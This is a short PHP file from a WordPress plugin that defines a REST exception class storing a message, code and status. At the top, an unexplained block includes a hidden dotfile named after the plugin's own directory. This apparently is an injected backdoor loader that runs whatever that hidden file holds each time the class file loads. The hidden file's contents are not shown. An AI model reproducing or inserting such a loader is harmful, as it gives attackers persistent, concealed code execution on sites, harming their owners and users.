<?php

/**
 * Class Tribe__REST__Exceptions__Exception
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__REST__Exceptions__Exception extends Exception {
	/**
	 * @var int
	 */
	protected $status;

	public function __construct( $message, $code, $status ) {
		$this->message = $message;
		$this->code    = $code;
		$this->status  = $status;
	}

	/**
	 * Return the error status.
	 * @return int
	 */
	public function getStatus() {
		return $this->status;
	}
}
